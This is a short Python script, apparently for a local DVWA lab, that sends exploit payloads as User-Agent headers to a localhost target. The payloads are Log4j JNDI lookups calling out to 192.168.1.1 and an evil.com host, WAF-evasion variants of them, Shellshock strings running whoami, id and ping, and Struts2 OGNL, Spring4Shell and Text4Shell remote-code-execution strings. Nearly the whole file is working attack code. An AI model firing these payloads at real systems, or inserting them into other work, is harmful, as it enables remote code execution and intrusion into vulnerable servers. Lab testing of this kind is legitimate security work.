import requests, time, random
TARGET = 'http://localhost:8080/vulnerabilities/sqli/'
COOKIES = {'PHPSESSID': '35cacc52bfc92dc522e7638831ba3474', 'security': 'low'}
PAYLOADS = [
    # --- Log4j / Shellshock Vanilla Payloads ---
    '${jndi:ldap://192.168.1.1/a}', '${jndi:rmi://192.168.1.1/b}', '${jndi:dns://192.168.1.1/c}',
    '() { :;}; /bin/bash -c "whoami"', '() { :;}; /bin/ping -c 1 8.8.8.8',
    
    # --- Log4j Bypasses (WAF evasion) & Shellshock variants ---
    '${jndi:${lower:l}${lower:d}ap://192.168.1.1/c}', '${jndi:${upper:L}DAP://192.168.1.1/c}',
    '${jndi:ldap://127.0.0.1#evil.com/a}', '() { _:; }; /bin/bash -c "id"',
    
    # --- Framework specific RCEs (Struts2 / Spring4Shell / Text4Shell) ---
    "%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id')}",
    'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{c2}i',
    "${script:javascript:java.lang.Runtime.getRuntime().exec('whoami')}"
]   
print('--- A06: Vulnerable Components ---')
for p in PAYLOADS:
    headers = {'User-Agent': p} # Exploit often sent via Headers
    res = requests.get(TARGET, params={'id': '1', 'Submit': 'Submit'}, cookies=COOKIES, headers=headers)
    print(f'[*] Component Exploit (Params+Headers): {p[:30]}... -> Status: {res.status_code}')
    time.sleep(random.uniform(0.5, 1.5))
